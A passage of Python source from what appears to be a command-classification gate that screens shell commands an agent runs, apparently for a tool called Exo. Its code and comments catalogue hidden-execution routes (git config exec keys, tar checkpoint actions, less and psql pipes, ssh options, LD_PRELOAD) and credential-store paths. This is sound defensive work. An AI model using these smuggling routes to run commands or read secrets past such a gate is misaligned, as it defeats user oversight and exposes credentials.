    moves where programs and config are found (LD_PRELOAD, PATH...). Git config set on the line (`git -c`,
    `git --config-env`, `git clone --config`, GIT_CONFIG_*) takes _git_config_kind. `words` is empty for a
    bare assignment."""
    if words and words[0].dynamic:
        return []
    prog, argv = (words[0].text.rsplit("/", 1)[-1] if words else ""), [w.text for w in words]
    parts: list[Classification] = []

    def nested(text: str, what: str) -> Classification | None:
        text = text.strip()
        if not text:
            return None
        if depth >= _DEPTH:
            c = _too_deep(cmd)
        else:
            c = classify_shell(text, depth + 1)
            c.summary = f"{what} {'' if c.summary.startswith('runs ') else 'runs '}{c.summary}"[:120]
        parts.append(c)
        return c

    takes, longs = _VALUE_OPTS.get(prog, ("", ()))
    if prog in ("sqlite3", "duckdb"):                # `--cmd` is `-cmd`
        argv = [a[1:] if a.startswith("--") and len(a) > 2 else a for a in argv]
    if prog == "tar" and argv[1:2] and argv[1][:1] not in ("", "-"):
        # old style (`tar xIf zstd a.tar`): each letter is an option, and each one that takes a value takes
        # the next word in turn
        opts, vals = [], argv[2:]
        for ch in argv[1]:
            opts.append("-" + ch)
            if ch in takes and vals:
                opts.append(vals.pop(0))
        argv = [argv[0], *opts, *vals]

    # words that may expand to no word or several: ssh's destination and remote command cannot be counted past one
    wild = frozenset(i for i, w in enumerate(words) if w.dynamic or (not w.quoted and (
        w.glob or re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))

    def values(names: tuple, least: int = 3, start: int = 1, sub_takes: str | None = None) -> list[str]:
        return _option_values(argv, names, start, takes if sub_takes is None else sub_takes, longs,
                              1 if prog == "ssh" else None, least, wild)

    def git_config(pairs: list[str], what: str) -> None:
        # KEY=VALUE pairs checked as `git -c` is: an exec key or a `!` value is opaque, and the value is read
        # as the command it is, so a category deny on it fires; a key that loads a config file or a template
        # is opaque; a key from a variable is opaque.
        for kv in pairs:
            key, _, value = kv.partition("=")
            kind = _git_config_kind(key, value)
            if re.search(r"[$`]", key):
                parts.append(_opaque(f"{what} sets a git config key the gate cannot read", cmd))
            elif kind == "exec":
                parts.append(_opaque(f"{what} sets {key}, which makes git run a command"[:120], cmd))
                nested(value.removeprefix("!"), f"{what} {key}")
            elif kind:
                parts.append(_opaque(f"{what} sets {key}, which {_GIT_CONFIG_DOES[kind]}"[:120], cmd))

    # assignments before the program (`GIT_SSH_COMMAND=x git ...`, also through env, sudo or timeout; a partly
    # quoted one is left in `words`), export's arguments, a bare assignment the rest of the line inherits, and
    # the ones hidden in an expansion, arithmetic or a redirection (`${PATH:=.}`, `$((PATH=10))`, `{PATH}>f`);
    # never an argument that merely looks like one (`grep EDITOR=x`). Only a real program position runs a value.
    n = len(before) - len(words)
    while n < len(before) and _ASSIGN.fullmatch(before[n].text):
        n += 1

    def split_assign(a: str) -> tuple[str, str]:
        # NAME+=v appends: for a listed variable that is the value $NAME then v (`PATH+=:/usr/bin` is
        # `$PATH:/usr/bin`); a command-valued one keeps v, the command text it adds
        name, value = re.split(r"\+?=|\[", a, maxsplit=1)[0], a.partition("=")[2]
        appends = re.match(r"[A-Za-z_]\w*\+=", a) and name not in _EXEC_ENV
        return name, f"${{{name}}}{value}" if appends else value

    assign_words = [w for w in before[:n] if _ASSIGN.fullmatch(w.text)]
    assigns = [w.text for w in assign_words]
    # pytest, or python -m pytest, before which PYTHONPATH adds nothing: the runner imports conftest.py and the
    # tests, project code the gate already lets it run (D-038 "Not done")
    runner = prog in ("pytest", "py.test") or bool(re.fullmatch(r"python[\d.]*", prog)) and argv[1:3] == ["-m", "pytest"]
    sets: list[tuple[str, str | None, bool, bool]] = [(*split_assign(w.text), not words, _kept_text(w.raw))
                                                      for w in assign_words]
    if prog in _EXPORTERS:
        sets += [(*split_assign(w.text), True, _kept_text(w.raw)) for w in words[1:] if _ASSIGN.fullmatch(w.text)]
    named = assigns + (argv[1:] if prog in (*_EXPORTERS, "unset") else []) + \
        [b for a, b in zip(argv, argv[1:]) if prog in ("test", "[") and a == "-v"]   # where NAME[..] is arithmetic
    sets += [(name, value, True, literal) for name, value, literal in _hidden_sets(k, named)]
    git_env: dict[tuple[str, ...], str] = {}
    for name, value, runs_nothing, literal in sets:
        if name in _EXEC_ENV:
            c = nested(_prompt_text(value or "") if name == "PS4" else (value or "").lstrip("|"), name)
            if c is not None and runs_nothing and c.category == "opaque_exec" and "unread nest" not in c.signals:
                parts.pop()                              # export runs nothing; an unknown value is not a hit
        elif name == "GIT_CONFIG_PARAMETERS":           # git's own format: 'key'='value' 'key2'='value2'
            try:
                git_config(shlex.split(value or ""), name)
            except ValueError:
                parts.append(_opaque(f"{name} sets git config the gate cannot read", cmd))
        elif m := _GIT_CONFIG_ENV.fullmatch(name):
            git_env[m.groups()] = value or ""
        elif name == "PYTHONPATH" and not runs_nothing and runner:
            pass                                         # a test runner already runs the project's code
        elif why := _env_hazard(name, value, literal):   # _EXEC_ENV_OPAQUE, and LESS with a `+` command
            parts.append(_opaque(f"{name} {why}", cmd, rebinds=name in _REBIND_VARS))
    parts += _indirect_sets(prog, words, cmd)
    for (kind, num), value in git_env.items():
        if kind == "KEY":
            git_config([f"{value}={git_env.get(('VALUE', num), '')}"], f"GIT_CONFIG_KEY_{num}")
        elif ("KEY", num) not in git_env:
            parts.append(_opaque(f"GIT_CONFIG_VALUE_{num} sets git config whose key is not on the line", cmd))
    for v in values(_EXEC_OPTS.get(prog, ())):
        nested(v, f"{prog} option")
    for v in values(_EXEC_FILE_OPTS.get(prog, ())):
        parts.append(_opaque(f"{prog} runs the script {v}"[:120], cmd))
    if prog == "tar":
        # any abbreviation longer than `--checkpoint`, which takes an optional value of its own
        for v in values(("--checkpoint-action",), least=len("--checkpoint-")):
            if v.startswith("exec="):
                nested(v[5:], "tar --checkpoint-action")
    if prog == "git":
        config: list[str] = []
        i = _git_subcommand(argv, config)
        sub, rest = (argv[i] if i < len(argv) else ""), argv[i + 1:]
        sub_takes = _GIT_VALUE_OPTS.get(sub, "")
        git_config(config, "git -c")
        if sub == "clone":                               # clone's own config
            git_config(values(("--config", "-c"), start=i + 1, sub_takes=sub_takes), "git clone --config")
        if sub == "config":                              # a command value set for later is read now
            git_config(_git_config_sets(rest), "git config")
        if sub in ("clone", "init"):                     # a template whose hooks run
            for v in values(("--template",), start=i + 1, sub_takes=sub_takes):
                if v:
                    parts.append(_opaque(f"git {sub} runs the hooks in the template {v}"[:120], cmd))
        for v in values(_GIT_EXEC_OPTS.get(sub, ()), start=i + 1, sub_takes=sub_takes):
            nested(v, f"git {sub} option")
        if sub == "bisect" and rest[:1] == ["run"] and len(rest) > 1 and depth < _DEPTH:
            parts.append(_opaque("git bisect run runs a command per step", cmd))
            parts += _classify_simple(_Cmd(words=words[i + 2:], heredocs=k.heredocs, herestrings=k.herestrings),
                                      cmd, depth + 1, ctx, piped)
        if sub == "submodule":
            j = 0
            while j < len(rest) and rest[j].startswith("-") and rest[j] != "--":
                j += 1                               # `git submodule -q foreach`, `--quiet`, `--cached`
            if rest[j:j + 1] == ["foreach"]:
                run = rest[j + 1:]
                while run and run[0].startswith("-"):
                    run = run[1:]                    # `foreach --recursive -q`
                nested(" ".join(run), "git submodule foreach")
    if prog in ("ssh", "scp", "sftp"):
        # `none` turns a command or library setting off (#232); a keyword the gate cannot read (`$OPT`, a glob, an
        # unclosed quote that an expansion may close) asks
        for v in values(("-o",)):
            key, value = _ssh_setting(v)
            if value.strip(" \t\r\n").lower() == "none" and (key in _SSH_EXEC_SETTINGS or key in _SSH_LIB_SETTINGS):
                continue
            if v.strip() and not key.isalnum():
                parts.append(_opaque(f"ssh -o {v} is a setting the gate cannot read"[:120], cmd))
            elif key in _SSH_EXEC_SETTINGS:
                c = nested(value, f"ssh {_SSH_EXEC_SETTINGS[key]}")
                if c is not None and key == "remotecommand":
                    if EXPOSURE.index(c.exposure) < 1:
                        c.exposure = "internal"
                    c.signals.append("remote host")
            elif key in _SSH_LIB_SETTINGS and value.strip().lower() != "internal":
                parts.append(_opaque(f"ssh {_SSH_LIB_SETTINGS[key]} loads a library", cmd))
    if prog == "ssh":
        for v in values(("-I",)):
            parts.append(_opaque(f"ssh -I loads the library {v}"[:120], cmd))
    if prog in ("less", "more"):                     # macOS more is less
        for a in argv[1:]:
            if not a.startswith("+"):
                continue
            # The initial command is read as keystrokes (`++cmd` for every file): `!` runs a shell command after
            # any of them (`+G!cmd`, `+:n!cmd`), `|` pipes to one, and a search (`/`, `?`, `&`) takes the rest as
            # its pattern unless a control key such as a newline or backspace ends it first.
            keys = a[2:] if a.startswith("++") else a[1:]
            last = max((j for j, ch in enumerate(keys) if ch < " " or ch == "\x7f"), default=-1)
            for j, ch in enumerate(keys):
                if ch in "/?&" and j > last:
                    break
                if ch == "!":
                    if keys[j + 1:j + 2] == "!" or nested(keys[j + 1:], f"{prog} +!") is None:
                        parts.append(_opaque(f"{prog} +! starts a shell", cmd))
                    break
                if ch == "|":
                    parts.append(_opaque(f"{prog} +| pipes to a command", cmd))
                    break
    if prog in _SQL_COMMAND_OPTS:
        texts = [a for a in argv[1:] if not a.startswith("-")] + values(_SQL_COMMAND_OPTS[prog])
        if prog == "psql":                           # `-o '|cmd'` pipes the output to the whole value, as `\o |cmd`
            for v in values(("-o", "--output")):
                if v.lstrip().startswith("|"):
                    nested(v.lstrip()[1:], "psql -o")

        def read(text: str) -> list[Classification]:
            n = len(parts)
            if prog in ("sqlite3", "duckdb"):
                for m in _DOT_COMMAND.finditer(text):
                    name, arg = m.group(1), m.group(2).strip()
                    pipe = _DOT_PIPE_ARG.search(arg)
                    if any(n.startswith(name) for n in _DOT_RUN):
                        nested(arg, f"{prog} .{name}")
                    elif pipe and any(n.startswith(name) for n in _DOT_PIPE):
                        nested(pipe.group(2) or pipe.group(3) or "", f"{prog} .{name}")
                        if "read".startswith(name):
                            parts.append(_opaque(f"{prog} .{name} runs what the command prints", cmd))
                    elif arg and not pipe and any(n.startswith(name) for n in _DOT_FILE):
                        parts.append(_opaque(f"{prog} .{name} reads or writes a file the gate does not see", cmd))
            else:
                for m in _SQL_SHELL[prog].finditer(text):
                    nested(m.group(1), f"{prog} shell command")
                pending, skip = False, 0             # a `|` after an output command on its line, as in `\o '|cmd'`
                for m in _SQL_PIPE.finditer(text):
                    if m.start() < skip:
                        continue
                    if m.group() != "|":
                        pending = m.group() != "\n"
                    elif pending:
                        end = text.find("\n", m.end())
                        end = len(text) if end < 0 else end
                        run, quote = text[m.end():end].strip(), text[m.start() - 1]
                        nested(run[:-1] if quote in "'\"" and run.endswith(quote) else run, f"{prog} shell command")
                        pending, skip = False, end
                if prog == "psql":
                    for m in _PSQL_META.finditer(text):
                        for run in re.findall(r"`([^`\n]*)`", m.group(0)):
                            nested(run, "psql backquote")
                if _SQL_PROGRAM.search(text):
                    parts.append(_opaque(f"{prog} runs a program on the database server", cmd))
            got = parts[n:]
            del parts[n:]
            return got

        for text in texts:
            parts += read(text)
        own = (_own_text.get() or [None])[0]       # the parts read() makes carry this command's own text (#394)
        parts += _once(ctx, (_exec_options, prog, depth), k, piped, read, own=own)   # a compound's stdin is shared
    return parts


def _classify_interpreter(prog: str, argv: list[str], k: _Cmd, cmd: str, depth: int, ctx: dict,
                          piped: str | None) -> list[Classification]:
    args = argv[1:]
    if args[:1] in (["--version"], ["-V"], ["-VV"], ["--help"], ["-h"]) or (prog == "node" and args[:1] == ["-v"]):
        return [_make("read", summary=f"{prog} {args[0]}", command=cmd)]
    eval_flags = _INTERPRETERS[prog]
    i = 0
    while i < len(args):
        a = args[i]
        code = None
        if a in eval_flags:
            code = args[i + 1] if i + 1 < len(args) else ""
        elif prog in ("python", "pypy") and a.startswith("-c") and len(a) > 2:
            code = a[2:]
        elif prog in ("perl", "ruby") and re.fullmatch(r"-[a-zA-Z]*[eE]", a):
            code = args[i + 1] if i + 1 < len(args) else ""
        if code is not None:
            return [_opaque(f"{prog} runs inline code", cmd), classify_code(code)]
        if prog in ("python", "pypy") and a == "-m" and i + 1 < len(args):
            mod = args[i + 1]
            if mod in _SAFE_PY_MODULES:
                if mod == "pip":
                    rest = args[i + 2:]
                    ok = not rest or rest[0] in TOOL_SUBCOMMANDS["pip"]
                    return [_make("shell", summary=f"pip {' '.join(rest[:1])}".strip(), command=cmd) if ok
                            else _opaque(f"pip {rest[0]}", cmd)]
                return [_make("shell", summary=f"{prog} -m {mod}", command=cmd)]
            return [_opaque(f"{prog} -m {mod} runs a module", cmd)]
        if a == "-" or not a.startswith("-"):
            if a != "-":
                return [_opaque(f"{prog} runs the script {a}"[:120], cmd)]
            break
        i += 2 if a in _INTERP_VALUE_FLAGS.get(prog, ()) else 1
    parts = [_runs_stdin(_opaque(f"{prog} reads code from its input", cmd), k)]
    src = parts[0].own               # the code comes from stdin: the text that shows where it comes from (#394)
    parts += _once(ctx, (classify_code,), k, piped, lambda t: [classify_code(t, _READER)], own=src)
    return parts


def _classify_exo(argv: list[str], cmd: str) -> Classification:
    sub = argv[1] if len(argv) > 1 else ""
    verb = argv[2] if len(argv) > 2 else ""
    if sub == "providers" and verb in ("add", "remove", "test", "default"):
        return _make("credentials", summary=f"exo providers {verb}", command=cmd)  # D-034: key setup is the user's
    if sub in ("keygen", "init") or (sub == "log" and verb == "append"):
        c = _make("store_write", summary=f"exo {sub} {verb}".strip(), command=cmd)
        c.signals.append("exo store")
        return c
    if sub == "update" and verb == "--pin-trust":   # writes the signed-update trust pin (D-073, #133)
        c = _make("store_write", summary="exo update --pin-trust", command=cmd)
        c.signals.append("exo store")
        c.parts = [_opaque("exo update starts, stops or changes Exo itself", cmd)]   # a deny on that still holds
        return c
    if sub in ("find", "get", "ctx", "links", "lint", "graph", "wire", "providers", "--version", "--help", "") or \
            (sub == "log" and verb in ("tail", "verify")):
        return _make("read", summary=f"exo {sub}".strip(), command=cmd)
    return _opaque(f"exo {sub} starts, stops or changes Exo itself", cmd)


def _ln_targets(argv: list[str]) -> list[str]:
    """Each relative `ln` target read against the link's folder: `-t DIR`, the last operand (an existing folder)
    or its parent. getopt permutes, so options may follow operands. Option values count as targets too. Only the
    last `-t` is kept (GNU ln rejects a second one), so the result stays linear in argv."""
    operands, values, tdir, i = [], [], "", 1
    while i < len(argv):
        a, i = argv[i], i + 1
        if a == "--":
            operands += argv[i:]
            break
        if not a.startswith("-") or a == "-":
            operands.append(a)
            continue
        if a.startswith("--"):           # unique prefixes: --t is --target-directory, --su is --suffix (--s is ambiguous)
            name, eq, val = a.partition("=")
            opt = "t" if "--target-directory".startswith(name) else "S" if len(name) > 3 and "--suffix".startswith(name) else ""
        else:                            # a cluster: -st DIR, -stDIR, -S SUFFIX
            m = re.match(r"-[^tS]*([tS])(.*)", a, re.S)
            opt, eq = (m.group(1), m.group(2)) if m else ("", "")
            val = eq
        if not opt:
            continue
        if not eq and i < len(argv):
            val, i = argv[i], i + 1
        values.append(val)
        if opt == "t":
            tdir = val
    dirs = [tdir]
    if len(operands) > 1:
        last = _expand_text(operands[-1])
        dirs += [last, os.path.dirname(last)]
    bases = [d for d in dict.fromkeys(map(_expand_text, dirs)) if d.startswith("/")]
    return [os.path.join(b, t) for t in dict.fromkeys(operands + values) if not _expand_text(t).startswith("/")
            for b in bases]
# A store check on a spelling makes the checks it covers redundant: a word checked with its ancestors and pieces
# ("wide") was also checked without ancestors ("narrow"), and that covers a whole-word check ("target").
_COVERS = {"target": {"target", "narrow", "wide"}, "narrow": {"narrow", "wide"}, "wide": {"wide"}, "dir": {"dir"}}


def _shell_words(w: _Word, seen: dict, check: str) -> list[str] | None:
    """The words bash makes of shell word ``w`` for a store check (#224): its text, plus its source spelling
    brace-expanded and then dequoted, as _shell_credential_hit reads it. A word the gate built (an `ln` target) has
    no source spelling and keeps its text. ``seen`` keeps each spelling's words for the line, so a spelling is
    expanded and charged once; [] when a check covering ``check`` already ran on it. None past the cap."""
    src = w.raw.replace("\\\n", "")
    if "{" not in src:
        return [w.text]
    if src not in seen:
        words = _brace_words(src, pool=1)
        seen[src] = (None if words is None else list(dict.fromkeys([w.text] + [d for e in words[1:] for d in _dequote(e)])),
                     set())
    words, done = seen[src]
    if done & _COVERS[check]:
        return []
    done.add(check)
    return words


def _in_store_dir_words(words: list[str] | None) -> bool:
    """_in_store_dir for any of a word's _shell_words; past the cap counts."""
    return words is None or any(_in_store_dir(x) for x in words)


def _store_touch(k: _Cmd, words: list, parts: list[Classification], ctx: dict) -> str:
    """What in a simple command writes to the Exo store, or ''. Reads of the store are fine."""
    seen = ctx.setdefault("store_braces", {})
    for op, t in k.redirs:
        # #217: a store file read on a numbered descriptor (`3< f`, `exec 2< f`) is reopened for writing by a
        # later `> /dev/fd/3` or `> /dev/stderr` on Linux, in this line or a later call of a persistent shell. A
        # write to stdout or stderr is not itself a store write, so on 1 or 2 any target the gate cannot pin to a
        # path counts too: one from a variable, a glob (`~/.exo/sta*/x`) or a relative name (the tool's folder).
        n = t.fd.lstrip("0") if t.fd.isascii() else ""     # compared as text: any length, never int()
        held = op == "<" and n != ""
        if op in _WRITE_REDIRS or held:
            targets = _shell_words(t, seen, "target")
            if targets is None or any(_store_word(x) for x in targets) or held and n in ("1", "2") and (
                    t.dynamic or t.glob or not _expand_text(t.text).startswith("/")):
                return t.text
    # `hash -p` and setting BASH_CMDS or BASH_ALIASES only record a path for a later name to run (#330), so a store
    # or descriptor path in their words is no store write that outranks a post on the line, whatever runs or sets
    # them (ssh, mosh, man -P, printf -v). A redirect is still checked, also after a cd into the store, and so is a
    # program named hash run by path (./hash), which is no builtin and rebinds nothing.
    if all(_store_quiet(p) for p in parts):
        return ""
    prog = words[0].text.rsplit("/", 1)[-1] if words else ""
    argv = [w.text for w in words]
    wide = prog in ("rm", "rmdir", "mv", "chmod", "chown", "chflags", "rsync", "shred", "unlink", "ln") or any(
        p.category == "delete" for p in parts) or (prog == "cp" and (_has(argv, "-s", "-l") or any(
            len(a) > 2 and ("--symbolic-link".startswith(a) or "--link".startswith(a)) for a in argv)))  # --sym, --li
    if prog == "ln":
        words = words + [_Word(t) for t in _ln_targets(argv)]
    for i, w in enumerate(words):
        expanded = _shell_words(w, seen, "wide" if wide else "narrow")   # braces first: `of=x{a,b}` is `of=xa of=xb`
        if expanded is None:
            return w.text
        for piece in dict.fromkeys(p for e in expanded for p in [e] + re.split(r"[:=,]", e)):
            if piece and _store_word(piece, ancestors=wide):
                return piece
        if prog == "git" and w.text in ("-C", "--work-tree", "--git-dir") and i + 1 < len(words) and \
                _in_store_dir_words(_shell_words(words[i + 1], seen, "dir")):
            return words[i + 1].text            # git checkout, reset or commit inside the store
    if ctx.get("store_cwd"):
        return ctx.get("fd_cwd") or "a path inside the store (after cd)"
    return ""


def _store_quiet(p: Classification) -> bool:
    """A part the store check takes as a read: a read, or an opaque part that only records a path for a later name
    to run (_REBINDS) and was built from such parts and plain shell ones alone (`ssh host 'hash -p /x ls; sort x'`
    and its hop). A shell part made costly (`sudo make`) outranked the read the rebind was, so it keeps the check. The
    category is checked too: a credentials floor carries every signal of the line as its own."""
    own = p.signals if p.own_signals is None else p.own_signals
    return p.category == "read" or p.category == "opaque_exec" and _REBINDS in own and all(
        q.category == "shell" and q.reversibility == "reversible" or _store_quiet(q) for q in p.parts)


def _combine(parts: list[Classification], cmd: str) -> Classification:
    """The most severe part, with every part's signals. A store write outranks everything but credentials."""
    signals = [s for p in parts for s in p.signals]
    credentials = [p for p in parts if p.category == "credentials"]
    store = [p for p in parts if p.category == "store_write"]
    c = credentials[0] if credentials else (store[0] if store else (_most_severe(parts) or _make("shell", command=cmd)))
    if c.own_signals is None:
        c.own_signals = list(c.signals)
    c.signals = list(dict.fromkeys(c.signals + signals))
    c.parts = c.parts + [p for p in parts if p is not c]    # keep what the chosen part was itself built from
    return c


def _piped_text(k: _Cmd, memo: dict | None = None) -> str | None:
    """What a simple command writes to a pipe, when the gate can read it: `cat <<EOF`, `echo`, `printf`.
    memo joins a compound's stdin, which many `cat`s inside it share, once per line."""
    words = [w for w in k.words]
    if not words or any(w.dynamic for w in words):
        return None
    prog = words[0].text
    if prog == "cat" and len(words) == 1 and (k.heredocs or k.herestrings):
        memo = {} if memo is None else memo
        key = (id(k.heredocs), id(k.herestrings))
        if key not in memo:
            memo[key] = "\n".join([h.body for h in k.heredocs] + [w.text for w in k.herestrings])
        return memo[key]
    if prog in ("echo", "printf"):
        return " ".join(w.text for w in words[1:] if not (prog == "echo" and w.text in ("-n", "-e", "-E")))
    return None


# Store folders and files that _SENSITIVE_PATH names and _SENSITIVE_SAMPLES does not show (/proc/<pid>/environ).
_STORE_FOLDERS = ("/proc", ".config/gcloud", ".config/muse", ".config/netlify", ".vercel")
_STORE_FILES = ("environ",)
_CHDIR_OPTS = {"env": ("-C", "--chdir"), "sudo": ("-D", "--chdir")}
_GLOBBY = re.compile(r"[*?\[]")
# The current folder at the start of a path: ~+, ~0, ~-0 (the folder stack), $PWD, ${PWD}, ${PWD:-x} and the like,
# $(pwd), `pwd`; and its parents, ${PWD%/*} and ${PWD%/*/*}.
_HERE = re.compile(r"^(~\+\d*|~-?\d+|\$PWD|\$\{PWD(?::?[-=?][^}]*)?\}|\$\{PWD%(?:/\*)+\}|\$\(pwd(?: -[LP])?\)|"
                   r"`pwd(?: -[LP])?`)(?=/|$)")


def _store_hints() -> tuple[set, dict, set]:
    """(store folder names, {(parent, folder): its sample path}, store file names) from the sample store paths. A
    dot folder (`.kube`) or `Netlify` is a store folder by its name; a plain one only below its parent (`.config/gh`,
    `.config/exo`, `.exo/keys`, `/proc`), so a checkout called exo or gh is not. Folders below home count from home
    ("~") down, one outside home (EXO_HOME, its keys) by its last part. HOME and EXO_HOME apply per call. The run
    folder's secrets are store file names too (#269: `cd ~/.exo/run/jobs && cat ../exod*`), but `run` is not a
    store folder here: that would make job output in run/jobs a secret (`cat 1.log` there stays a read)."""
    home = os.path.normpath(_home())
    root = home.rstrip("/") + "/"                   # HOME=/ too
    singles, pairs, names = {"Netlify"}, {}, set(_STORE_FILES)
    keys, keys_file, claude = _dynamic_secret_paths()
    files = [os.path.join(home, s) for s in _SENSITIVE_SAMPLES] + [os.path.join(keys, "seat.key"), keys_file,
                                                                    claude + "/"]
    folders = [os.path.join(home, d) for d in _STORE_FOLDERS] + [os.path.dirname(keys)]     # and EXO_HOME
    for folder, name in [x.rpartition("/")[::2] for x in files] + [(d, "") for d in folders]:
        folder = os.path.normpath(folder)
        if folder == home or folder.startswith(root):
            parts, start = ["~"] + folder[len(root):].split("/"), 1
        elif root.startswith(folder + "/"):
            parts, start = [], 0
        else:
            parts = folder.split("/")
            start = max(1, len(parts) - 1)
        for k in range(start, len(parts)):
            if parts[k].startswith("."):
                singles.add(parts[k])
            elif parts[k]:
                pairs[parts[k - 1], parts[k]] = "/".join(parts[:k + 1])
        names.add(name)
    return singles, pairs, (names | set(_run_secrets())) - {""}


def _brace_glob(text: str) -> str:
    """A brace set (`{config,x}`, `config{,.bak}`) as a glob that matches at least what it names: the first `{` to the
    last `}` is `*` (two string searches, not a regex that rescans the rest of the word from each `{`)."""
    if not re.search(r"\{[^{}]*(,|\.\.)", text):
        return text
    i, j = text.find("{"), text.rfind("}")
    return text[:i] + "*" + text[j + 1:] if j > i else text


def _brace_alts(text: str) -> list:
    """The words a brace set spells (`~/.{ssh,x}`: ~/.ssh and ~/.x; a range `{1..3}` or `{a..c}` too), up to 16, in a
    word of up to 4096 characters; past that, or for a stepped range (`{1..9..2}`), one glob (_brace_glob)."""
    if len(text) > 4096:
        return [_brace_glob(text)]
    out, todo = [], [text]
    while todo:
        t = todo.pop()
        m = re.search(r"\{([^{},]*(?:,[^{},]*)+)\}", t)     # an innermost set with a comma
        r = None if m else re.search(r"\{(-?\d{1,6})\.\.(-?\d{1,6})\}|\{([A-Za-z])\.\.([A-Za-z])\}", t)
        if m:
            alts, hit = m.group(1).split(","), m
        elif r:                                         # a range: {1..3} is 1 2 3, {a..c} is a b c
            a, b = (int(r.group(1)), int(r.group(2))) if r.group(1) else (ord(r.group(3)), ord(r.group(4)))
            if abs(b - a) >= 16:
                return [_brace_glob(text)]
            step = 1 if b >= a else -1
            # a bound with a leading zero pads every word to the wider bound, as bash does: {007..10} is 007 ... 010
            pad = max(map(len, r.group(1, 2))) if r.group(1) and any(re.match(r"-?0\d", n) for n in r.group(1, 2)) else 0
            alts, hit = [f"{x:0{pad}d}" if r.group(1) else chr(x) for x in range(a, b + step, step)], r
        else:
            out.append(t)
            continue
        if len(out) + len(todo) + len(alts) > 16:
            return [_brace_glob(text)]
        todo += [t[:hit.start()] + x + t[hit.end():] for x in alts]
    return out


_POSIX_CLASSES = {"alpha": "a-zA-Z", "upper": "A-Z", "lower": "a-z", "digit": "0-9", "alnum": "a-zA-Z0-9",
                  "xdigit": "0-9A-Fa-f", "word": "a-zA-Z0-9_", "space": " \t\n\r\x0b\x0c", "blank": " \t",
                  "punct": ":-@!-/[-`{-~", "print": " -~", "graph": "\"-~!", "cntrl": "\x00-\x1f\x7f"}
_NESTED_CLASS = re.compile(r"\[[!^]?\]?[^\][]*\[[:=.]")


def _fn_glob(glob: str) -> str | None:
    """A bash glob as an fnmatch pattern, or None when it could match anything (a long run of `[`, on which fnmatch
    is quadratic, or an unknown class). `[^x]` is `[!x]`; a `]` first in a set is a member; a class inside a set
    (`[[:alpha:]]`, `[[=e=]]`) is spelt out; a `[` that opens no set is a literal `[`."""
    if glob.count("[") > 32:
        return None
    out, i, n = [], 0, len(glob)
    while i < n:
        if glob[i] != "[":
            out.append(glob[i])
            i += 1
            continue
        j = i + 1
        neg = j < n and glob[j] in "!^"
        j += neg
        body = []
        if j < n and glob[j] == "]":
            body.append("]")
            j += 1
        closed = False
        while j < n:
            if glob[j] == "]":
                closed = True
                break
            if glob[j] == "[" and glob[j + 1:j + 2] in (":", "=", "."):
                kind = glob[j + 1]
                end = glob.find(kind + "]", j + 2)
                if end >= 0:
                    name = glob[j + 2:end]
                    if kind == ":" and name not in _POSIX_CLASSES or kind != ":" and len(name) != 1:
                        return None
                    body.append(_POSIX_CLASSES[name] if kind == ":" else name)
                    j = end + 2
                    continue
            body.append(glob[j])
            j += 1
        if not closed:
            out.append("[[]")
            i += 1
            continue
        out.append("[" + ("!" if neg else "") + "".join(body) + "]")
        i = j + 1
    return "".join(out)


def _glob_names(glob: str, names) -> list:
    """The ``names`` a bash glob could match (see _fn_glob); all of them when it could match anything."""
    pat = _fn_glob(glob)
    return list(names) if pat is None else fnmatch.filter(names, pat)


def _could_name(glob: str, hints: set) -> bool:
    """A glob that could match one of ``hints``: its literal parts are tried as substrings first, which is cheap."""
    pat = _fn_glob(glob)
    if pat is None:
        return True
    lits, blob = [x for x in re.split(r"[*?]|\[!?\]?[^\]]*\]", pat) if x], "/".join(hints)
    return all(t in blob for t in lits) and any(all(t in h for t in lits) for h in hints) \
        and bool(fnmatch.filter(hints, pat))


def _cd_walk(cmds: list, targets: list, pieces: list, bodies: list) -> None:
    """From simple commands: the working-folder targets (cd, pushd, git -C, env -C, sudo -D, tar -C, also after
    time, command, builtin, ! or an assignment), the words that may name a path (all but the program and the
    targets, and redirection targets; with whether bash expands a brace set in them) and the text a shell runs
    (`bash -c`, a heredoc fed to a shell)."""
    for k in cmds:
        ws = [w.text for w in k.words]
        i = 0
        skip: set = set()                           # the targets' own words: entering a folder reads nothing
        while i < len(ws) and (ws[i] in _OPENERS or _ASSIGN.fullmatch(ws[i]) or ws[i].rsplit("/", 1)[-1] in _PREFIXES):
            base = "" if ws[i] in _OPENERS or _ASSIGN.fullmatch(ws[i]) else ws[i].rsplit("/", 1)[-1]
            i += 1
            while base in _PREFIXES and i < len(ws) and ws[i].startswith("-") and ws[i] != "-":
                word, i = ws[i], i + 1
                opt, eq, val = word.partition("=")
                if len(opt) >= (3 if base == "env" else 5) and "--chdir".startswith(opt):
                    opt = "--chdir"                 # getopt takes a unique prefix: env --c=dir, sudo --chd=dir
                c = next((j for j in range(1, len(word)) if "-" + word[j] in _PREFIXES[base]), 0)
                if word[1:2] != "-" and len(word) > 2 and c:        # a short cluster or value: -iC dir, -Cdir
                    opt, eq, val = "-" + word[c], word[c + 1:], word[c + 1:]
                if not eq and (opt in _PREFIXES[base] or opt in _CHDIR_OPTS.get(base, ())) and i < len(ws):
                    val, i = ws[i], i + 1
                if opt in _CHDIR_OPTS.get(base, ()):
                    targets += [val, val[1:]] if val.startswith("=") else [val]     # -C=dir: getopt's "=dir"
                    skip.add(i - 1)
            if base == "timeout" and i < len(ws) and re.fullmatch(r"[\d.]+[smhd]?", ws[i]):
                i += 1
        prog, rest = (ws[i].rsplit("/", 1)[-1], ws[i + 1:]) if i < len(ws) else ("", [])
        if prog in ("cd", "pushd"):
            j = next((j for j, a in enumerate(rest) if not re.fullmatch(r"-[LPen@]*|--", a)), len(rest))
            targets += rest[j:j + 1]
            skip.add(i + 1 + j)
        elif prog == "git":
            j = 0
            while j < len(rest) and rest[j].startswith("-"):
                if rest[j] in ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"):
                    if rest[j] == "-C" and j + 1 < len(rest):
                        targets.append(rest[j + 1])
                        skip.add(i + 2 + j)
                    j += 1
                j += 1
            skip.add(i + 1 + j)                     # the subcommand (`git config`) is not a path
        elif prog == "tar":                         # tar -C dir: the names after it are in dir
            j = 0
            while j < len(rest):
                a, j = rest[j], j + 1
                opt, eq, val = a.partition("=")
                if len(opt) >= 5 and "--directory".startswith(opt):        # --directory dir, --dir=dir
                    m = None if eq else j
                elif re.fullmatch(r"-C.+", a):                              # -Cdir
                    val, m = a[2:], None
                elif re.fullmatch(r"-[A-Za-z]*C", a) or j == 1 and re.fullmatch(r"[A-Za-z]*C[A-Za-z]*", a):
